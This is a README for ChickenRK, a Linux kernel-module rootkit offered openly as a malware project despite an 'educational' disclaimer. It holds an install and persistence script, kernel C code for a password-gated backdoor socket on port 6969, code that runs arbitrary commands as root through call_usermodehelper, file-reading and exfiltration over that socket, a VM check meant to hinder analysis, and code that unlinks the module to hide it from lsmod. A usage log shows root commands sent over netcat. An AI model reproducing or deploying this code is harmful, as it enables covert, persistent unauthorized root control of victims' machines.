# 🐣 Chicken RK
##### Disclaimer 
*This is for educationals purposes, hacking is bad, don't do bad things, because it's not good* !!!

ChickenRK is a rootkit, a LKM (**L**inux**K**ernel**M**odule) installed by an attacker after gained root privileges in order to maintain root access on a server, this is designed to work on Ubuntu on the last kernel version at this date (13/05/2023): Linux kernel 5.19.0-35-generic. 

First of all, why ChickenRK as a name for a rootkit, this is in memory of one of the greatest songs on the planet : [ChickenAttack](https://www.youtube.com/watch?v=mfKach4nmT0)

All this project is written in C on a `Ubuntu 22.04.1/5.19.0-35-generic`

It's my first real malware project and my first "useful" kernel driver, so I've learnt a lot during development of this project even if I didn't manage to do all tasks I wanted to but at least it's working and working on up to data Ubuntu.

## Instalation
- get a root shell :)
```
git clone https://github.com/giovanni-lb/chicken_rk.git

cd chicken_rk

sudo ./init.sh
```

## Features


### Persitance

Install the rootkit on the victim machine is good, but if you load your kernel driver using only `sudo insmod module.ko` once the machine rebooted your driver will be gone. One of the ways to make our drivers to be loaded at the boot time is to use the file [/etc/modules](https://manpages.ubuntu.com/manpages/trusty/fr/man5/modules.5.html) that coutain the list of custome kernel drivers to load at boot time.

I've made a little bash script in order to automate this task:
*init.sh*
```bash
#!/bin/bash

# compile the project
cd src/ && make clean && make install

# copy driver to persistance location
mkdir /lib/modules/5.19.0-41-generic/kernel/drivers/chicken_rk

cp my_rk.ko /lib/modules/5.19.0-41-generic/kernel/drivers/chicken_rk/

echo "chicken_rk" > /etc/modules-load.d/chicken_rk.conf

# Update kernel modules dependencies
depmod -a

# /etc/modules coutain the list of module that will be load at boot time
echo "chicken_rk" >> /etc/modules
```

Then when the rootkit is installed it will create a config file with some information that can be send using the command `getconfig`

*config.txt exemple*
```
start_time = 1684005525
version = 5.19.0-41-generic
hostname = kernel-dev
fake_random = h(;v@bT^>48auDf*"$KVQ}8_XhBD|1>
```


### Remote access 

When ChickenRK will be loaded it will open a socket on the port 6969 that will allow a remote attacker to connect.

Once connected you will be requested to input a password in order to get access to the rootkit:

In case of a wrong password:
```
nc <IP_Infected> 6969

Enter password to continue: test

Wrong password, byebye
```

But when you input the correct password:
```
Welcome to chicken rootkit, best rootkit on the market because of chicken

   MENU  

| menu          | Display menu

| create <file> | Create a file 

| read <file>   | Read a file 

| chicken <X>   | Spawn X chicken on the pc

| cmd <cmd>     | Run a command in a root shell

| unhide        | Unhide the kernel module

| hide          | Hide the kernel module

| exit          | Exit rk console 

(chikenRK) 
```

#### Connection init

For the connection between the rootkit and the user i choosed to create a socket, using the  [socket](https://www.kernel.org/doc/html/v5.6/networking/kapi.html#c.socket) struct and [sockaddr_in](https://www.gta.ufrj.br/ensino/eel878/sockets/sockaddr_inman.html) struct in order to open a socket on a choosen port for communication.

```c
// Set up the address struct with the port number
// AF_INET = ipv4 | AF_INET6 = ipv6
// INADDR_ANY (0.0.0.0) | INADDR_LOOPBACK (127.0.0.1)
memset(&sin, 0, sizeof(sin));
sin.sin_family = AF_INET;
sin.sin_addr.s_addr = htonl(INADDR_ANY);
sin.sin_port = htons(PORT);

// Create the socket
// AF_INET = ipv4 | AF_INET6 = ipv6
// SOCK_STREAM = TCP | SOCK_DGRAM = UDP
// IPPROTO_TCP = TCP | IPPROTO_UDP = UDP
err = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);

// Bind the socket to the address
// binding an addresses is an association between service and ip
err = kernel_bind(sock, (struct sockaddr *)&sin, sizeof(sin));
```

with that done we can create a socket that anyone that can connect to the PC using TCP to send and get some data thru the socket.

In order to handle the connection with the user i've created a small function to accept the connection and then release the socket after the user terminate his connection

*src/backdoor.c:296* 
```c
int handle_connections(struct socket *socket)

    while (!kthread_should_stop())
    {
        // Accept new connections
        error = kernel_accept(socket, &new_socket, 0);

        // call to the main function of our remote feature
        handle_client(new_socket); 

		// when the "main" function return release the socket
        sock_release(new_socket);
	}
```

#### Password check
In order to be able to send some command to the rootkit the user need to enter a password to get acces to it.

Once connected to the correct port (by default 6969), you will get a message:
`Enter password to continue:`

The user input will be pass as an argument to the function `int check_password(const char *input)` that will make differents matematicals operation to check if the modified input is the same as the reference.

>*(the password check isn't really complexe due to the usage of reversible operations that can be used to get the original password but still a bit of anti reversing like a easy/medium challenge for CTF reverse)*

#### Run a command 
*src/backdoor.c:49* 
```c
void run_cmd(char *command)
	int ret;
    char cmd[MAX_BUFFER_SIZE];

    snprintf(cmd, sizeof(cmd), "%s > /tmp/rk/output 2> /tmp/rk/error", command);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "HOME=/", "TERM=linux",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL, NULL };
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
```
[call_usermodehelper (path,  argv, envp, wait)](https://archive.kernel.org/oldlinux/htmldocs/kernel-api/API-call-usermodehelper.html) is a function that allow us to run a process in user-land from our driver in the kernel and `UMH_WAIT_PROC` wait for the created process to terminate. So in order to run any command given by the user we needed to create a fake argv (argument variable) and envp (environment variable) in order to pass it as parameter to `call_usermodehelper`.
I've tried to run the command directly but seems to failed, but by running the given command under `/bin/sh` with the argument `-c` seems to work

In order to get the redirection of our command to our socket I've redirected the command result to `/tmp/rk/output` that allow me using the read file fonctionality to display the result to the remote user

*src/backdoor.c:268*
```c
else if (strncmp(buf, "cmd ", 4) == 0)
{
     char *command = buf + 4;
     run_cmd(*new_socket, command);
     send_file_content(new_socket, "/tmp/rk/output");
}
```

#### Read files

Sending data back to the socket is really important because a blind rootkit should be great for a pwn challenge in CTF, but really not usefull in real conditions.

To send back data we can use the function [kernel_sendmsg(sock, msg, vec, num, size);](https://www.kernel.org/doc/html/v5.6/networking/kapi.html#c.kernel_sendmsg), that use 3 structs :
* [socket](https://www.kernel.org/doc/html/v5.6/networking/kapi.html#c.socket) for managing sockets
* [msghdr](https://docs.huihoo.com/doxygen/linux/kernel/3.7/structmsghdr.html) for the message header
* [kvec](https://docs.huihoo.com/doxygen/linux/kernel/3.7/structkvec.html) for I/O operations, starting point and len of the message data to send

*src/backdoor.c:106*
```c
int send_file_content(struct socket *sock, const char *filepath)

{
	... 
    char *buf = kmalloc(4096, GFP_KERNEL); // Buffer size of 4096
    filep = filp_open(filepath, O_RDONLY, 0); // open the given filepath
	
	// Send by block of 4096 bytes 
    while ((read_len = kernel_read(filep, buf, 4096, &pos)) > 0)
    {
        vec.iov_len = read_len; // set the len of the message
        vec.iov_base = buf;     // set the data to send
        memset(&msg, 0, sizeof(msg));

        iov_iter_kvec(&msg.msg_iter, WRITE, &vec, 1, read_len); //setup before send

		msg.msg_flags = MSG_NOSIGNAL;
        
		// Send the message to the given socket
        error = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
	... 
}
```

#### Chicken attack

Just to stay on the theme i've created a really usefull command `chicken <X>` that allow the user to spawn X chicken in the root directory of the machine, that will create X files nammed `/root/chickenX.quack`  with this content:
```
         __
       _/o \\
      /_    |               | /
       W\\  /              |////
         \\ \\  __________||//|/
          \\ \\/         /|/-//-
           |     -----  // --
           |      -----   /-
           |     -----    /
            \\            /
              \\_/  \\___/
                \\  //
                 |||
                 |||
                Z_>>
```

### Anti analyse
I wanted to add a bit of anti debugging for my rootkit, but first of all during this project I've struggled to get a great debugging setup so for me this project is already hard to debug !

But I've added a check on the cpu information stored in the file [/proc/cpuinfo](https://www.thegeekdiary.com/proccpuinfo-file-explained/) that could give us some information on the cpu and sometimes tell us if we are in a VM or emulate (like with qemu). To do that i wrote a simple function that read information in this file and check if the string "QEMU" or "Hypervisor" is in it

As this project is a kernel drivers it also more hidden than a user-land program that will create process, but it's easy to list current loaded drivers by typing `sudo lsmod` in a terminal to get all loaded driver (included our rootkit when it's not hidden). But in order to hide our driver from the kernel's driver list (that is just a linked list of kernel module) we need to unlink our module from the list:

*hide.c:11*
```c
void unlink_module(struct module *mod)
{
    struct list_head *prev;
    struct list_head *next;

    prev = mod->list.prev;
    next = mod->list.next;

    // unlink our module
    prev->next = next;
    next->prev = prev;

    mod->list.prev = NULL;
    mod->list.next = NULL;

}
```

### Usage Exemple
```
nc 192.168.28.141 6969

Enter password to continue: ???????????
 
Welcome to chicken rootkit, best rootkit on the market because of chicken

   MENU  
| menu | Display menu
| create <file> | Create a file 
| read <file> | Read a file 
| cmd <cmd>     | Run a command in a root shell
| getconfig      | Get host config
| chicken <X> | Spawn X chicken on the pc
| unhide    | Unhide the kernel module
| hide          | Hide the kernel module
| exit     | Exit rk console 

(chikenRK) cmd id
uid=0(root) gid=0(root) groups=0(root)
(chikenRK) cmd pwd
/
(chikenRK) getconfig
start_time = 1684005525
version = 5.19.0-41-generic
hostname = kernel-dev
fake_random = h(;v@bT^>48auDf*"$KVQ}8_XhBD|1>
(chikenRK) hide
(chikenRK) chicken 10
(chikenRK) read /root/chicken5.quack
     __
   _/o \
  /_    |               | /
   W\  /              |////
     \ \  __________||//|/
      \ \/         /|/-//-
       |     -----  // --
       |      -----   /-
       |     -----    /
        \            /
          \_/  \___/
            \  //
             |||
             |||
            Z_>>
```
